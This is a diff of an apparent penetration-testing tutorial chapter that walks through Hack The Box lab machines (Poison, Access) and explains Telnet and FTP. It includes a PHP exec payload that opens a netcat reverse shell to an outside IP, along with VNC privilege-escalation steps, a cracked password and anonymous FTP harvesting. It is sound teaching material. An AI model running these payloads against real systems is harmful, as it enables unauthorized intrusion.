-&lt;?php exec\('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2&gt;&1\|nc 10.10.14.135 6001 &gt;/tmp/f'\) ?&gt;
+```php
+<?php exec('
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.135 6001 >/tmp/f') 
+?>
+```
 
 When we make the GET request to view the log, we will get a reverse shell:
 
-┌─\[rin@parrot\]─\[~/boxes/Poison\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Poison]
 └──╼ $nc -lvnp 6001
-
-listening on \[any\] 6001 ...
-
-connect to \[10.10.14.135\] from \(UNKNOWN\) \[10.129.105.0\] 35870
-
+listening on [any] 6001 ...
+connect to [10.10.14.135] from (UNKNOWN) [10.129.105.0] 35870
 sh: can't access tty; job control turned off
-
 $ whoami
-
 www
+```
 
 The shell isn't great and Python is not on the box to use to upgrade it. If you had got access this way, it would have ben to explore the box to find the pwdbackup.txt file and from there the password for the charix user to enable the use of SSH.
 
 Once SSH'd onto the machine, you discover a file secret.zip which you can copy back to your local host using the scp command:
 
-┌─\[rin@parrot\]─\[~/boxes/Poison\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Poison]
 └──╼ $scp charix@poison.htb:/home/charix/secret.zip .
-
 Password for charix@Poison:
-
 secret.zip 100% 166 0.5KB/s 00:00
+```
 
 The file can be unzipped using charix's password to reveal the secret file which has binary data in it but otherwise it is not clear what it is for.
 
 Back to enumeration. Looking at the processes running, you will notice a process Xvnc:
 
+```bash
 charix@Poison:~ % ps -aux
-
 USER PID %CPU %MEM VSZ RSS TT STAT STARTED TIME COMMAND
-
-root 11 100.0 0.0 0 16 - RL 14:00 30:53.63 \[idle\]
-
-root 0 0.0 0.0 0 160 - DLs 14:00 0:00.01 \[kernel\]
-
+root 11 100.0 0.0 0 16 - RL 14:00 30:53.63 [idle]
+root 0 0.0 0.0 0 160 - DLs 14:00 0:00.01 [kernel]
 root 1 0.0 0.1 5408 976 - ILs 14:00 0:00.01 /sbin/init --
-
-root 2 0.0 0.0 0 16 - DL 14:00 0:00.00 \[crypto\]
-
-&lt;SNIP&gt;
-
-root 614 0.0 0.9 23620 8868 v0- I 14:00 0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tight
-
-root 625 0.0 0.7 67220 7048 v0- I 14:00 0:00.03 xterm -geometry 80x24+10+10 -ls -title X Desktop
-
+root 2 0.0 0.0 0 16 - DL 14:00 0:00.00 [crypto]
+<SNIP>
+root 614 0.0 0.9 23620 8868 v0- I 14:00 0:00.04 Xvnc :1 -desktop X 
+    -httpd /usr/local/share/tight
+root 625 0.0 0.7 67220 7048 v0- I 14:00 0:00.03 xterm -geometry 80x24+10+10 
+    -ls -title X Desktop
 root 626 0.0 0.5 37620 5312 v0- I 14:00 0:00.01 twm
+```
 
 To get more information, we can display the process information in more detail:
 
-charix@Poison~ % ps -auxww \| grep vnc
-
-root 614 0.0 0.9 23620 8868 v0- I 14:00 0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
+```bash
+charix@Poison~ % ps -auxww | grep vnc
+root 614 0.0 0.9 23620 8868 v0- I 14:00 0:00.04 Xvnc :1 -desktop X 
+  -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority 
+  -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd 
+  -rfbport 5901 -localhost -nolisten tcp :1
+```
 
 From this, we know that TightVNC is running as user root and this is listening on port 5901 on localhost. To access the VNC server, you first set up a tunnel using:
 
+```bash
 charix@Poison:~ %
-
-ssh&gt; -D 1080
-
+ssh> -D 1080
 Forwarding port.
+```
 
 On our local box, you can confirm that you can access this port by using:
 
-┌─\[rin@parrot\]─\[~/boxes/Poison\]
+```bash
+┌─[rin@parrot]─[~/boxes/Poison]
+└──╼ $proxychains curl --http0.9 http://127.0.0.1:5901
 
-└──╼ $proxychains curl --http0.9 [http://127.0.0.1:5901](http://127.0.0.1:5901)
-
-ProxyChains-3.1 \([http://proxychains.sf.net\](http://proxychains.sf.net\)\)
-
-\|S-chain\|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:5901-&lt;&gt;&lt;&gt;-OK
-
-RFB 003.008
+ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|
+  -<>-127.0.0.1:1080-<><>-127.0.0.1:5901-<><>-OK RFB 003.008
+```
 
 Note that you used proxychains here to access the VNC server. You could have used the --socks5 argument to curl as well.
 
 We can then run vncviewer using proxychains. This asks for a password and so trying the "secret" file that you got from unzipping "secret.zip" from charix's home directory:
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Poison\]
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Poison]
 └──╼ $proxychains vncviewer -passwd secret 127.0.0.1:5901
-
-ProxyChains-3.1 \([http://proxychains.sf.net\](http://proxychains.sf.net\)\)
-
-\|S-chain\|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:5901-&lt;&gt;&lt;&gt;-OK
-
+ProxyChains-3.1 (http://proxychains.sf.net) |S-chain|
+  -<>-127.0.0.1:1080-<><>-127.0.0.1:5901-<><>-OK
 Connected to RFB server, using protocol version 3.8
-
 Enabling TightVNC protocol extensions
-
 Performing standard VNC authentication
-
 Authentication successful
+Desktop name "root's X desktop (Poison:1)"
+```
 
-Desktop name "root's X desktop \(Poison:1\)"
+Which launches a VNC session as root
 
-Which launches a VNC session as root \(Figure 3-7\)
+![VNC session as root on Poison](../.gitbook/assets/poison2.png)
 
-!\[A picture containing graphical user interface, text
 
-Description automatically generated\]\(../.gitbook/assets/5%20%285%29.png\)
-
-VNC session as root on Poison
 
 VNC's encryption of passwords is more obfuscation than encryption as the key that is used for the DES encryption is well known. It is trivial to find an application that will decrypt the password in the file "secret" and it turns out to be "VNCP@$$!".
 
-Telnet and FTP
+## Telnet and FTP
 
-Telnet
+### Telnet
 
 Telnet is an old protocol that provides a command-line interface via remote access. The telnet server usually listens on TCP port 23. Because it was never designed with security in mind, it is less used for administration purposes on computers but is still used on network devices and Internet of Things devices. A large number of IoT devices have shipped with default passwords set for Telnet access allowing attackers to access and take over the devices to enlist them in "botnets". Botnets are a collection of devices all running similar software/malware that can be coordinated in an attack like a Distributed Denial of Service \(DdoS\).
 
 What commands are supported by the telnet server depends on the platform. On windows for example, it will be the cmd.exe commands that are supported. On a Cisco network switch, you will be presented with the Cisco CLI \(Command Line Interface\). In this regard, it is similar to SSH in running a specific shell after a successful login.
 
-FTP
+### FTP
 
 File Transfer Protocol allows a client to upload and download files using a set of simple commands. The FTP server normally has 2 TCP ports that it uses, port 21 for FTP commands and port 20 for sending and receiving data. FTP operates in two different modes active and passive. In active mode, the FTP client connects to the command port of the server on port 21. The client starts listening for data on a port that is the next port from the one it opened to connect to the server. The FTP server connects to this port on the client from its local data port and sends or receives data when requested by the client.
 
 The trouble with active mode is that clients are often behind firewalls or on a private network that does not allow for inbound connections on dynamic ports. For this reason, FTP also supports a passive mode. In passive mode, the server opens a random port for data connections and passes this to the client to connect to. Of course, having the FTP server open to a range of open ports to support passive mode creates security vulnerabilities of its own.
 
-Exercise: Enumerating and exploiting FTP and Telnet on Hack The Box case machine Access
+#### Exercise: Enumerating and exploiting FTP and Telnet on Hack The Box case machine Access
 
 Access is a Windows box that has an FTP server on which you will find a backup of an MS Access database and a password-protected ZIP file containing a backup of a Microsoft Outlook email file. Dumping the Access database give server usernames and passwords, one of which can be used to unzip the ZIP file. Viewing the emails in the PST file found there, gives another password that can be used to gain access via Telnet.
 
 An nmap scan shows that the TCP ports 21 \(FTP\), 23 \(Telnet\) and 80 \(HTTP\) are open. Nmap tells you that anonymous login is allowed on FTP.
 
-┌─\[✗\]─\[rin@parrot\]─\[~/boxes/Access\]
-
+```bash
+┌─[✗]─[rin@parrot]─[~/boxes/Access]
 └──╼ $sudo nmap -v -sC -sV -T4 --min-rate 1000 -p- access.htb -oA nmap/full-tcp
-
 PORT STATE SERVICE VERSION
-
 21/tcp open ftp Microsoft ftpd
-
-\| ftp-anon: Anonymous FTP login allowed \(FTP code 230\)
-
-\|\_Can't get directory listing: PASV failed: 425 Cannot open data connection.
-
-\| ftp-syst:
-
-\|\_ SYST: Windows\_NT
-
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
+| ftp-syst:
+|_ SYST: Windows_NT
 23/tcp open telnet?
-
 80/tcp open http Microsoft IIS httpd 7.5
-
-\| http-methods:
-
-\| Supported Methods: OPTIONS TRACE GET HEAD POST
-
-\|\_ Potentially risky methods: TRACE
-
-\|\_http-server-header: Microsoft-IIS/7.5
-
-\|\_http-title: MegaCorp
-
+| http-methods:
+| Supported Methods: OPTIONS TRACE GET HEAD POST
+|_ Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: MegaCorp
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
 
 On logging in with user anonymous, password anonymous, you find 2 directories, "Backups" and "Engineer". The Backups directory contains an mdb file which indicates that it is a backup of an Access database file. The Engineer directory contains a zip file named "Access Control.zip".
 
 To download everything to our machine, we can use wget from our local machine:
 
-┌─\[rin@parrot\]─\[~/boxes/Access/FTP\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Access/FTP]
 └──╼ $wget -r --no-passive-ftp ftp://anonymous:anonymous@access.htb
-
---2021-02-28 14:58:13-- ftp://anonymous:\*password\*@access.htb/
-
-=&gt; ‘access.htb/.listing’
-
-Resolving access.htb \(access.htb\)... 10.129.105.84
-
-Connecting to access.htb \(access.htb\)\|10.129.105.84\|:21... connected.
-
+--2021-02-28 14:58:13-- ftp://anonymous:*password*@access.htb/
+=> ‘access.htb/.listing’
+Resolving access.htb (access.htb)... 10.129.105.84
+Connecting to access.htb (access.htb)|10.129.105.84|:21... connected.
 Logging in as anonymous ... Logged in!
-
-&lt;SNIP&gt;
+<SNIP>
+```
 
 The -r flag tells wget to do a recursive fetch which goes into every directory and fetches the contents. The --no-passive-ftp flag tells wget not to try and download files using passive mode. If you try and run the command without the --no-passive-ftp flag, wget will try and establish passive mode and fail, aborting the command.
 
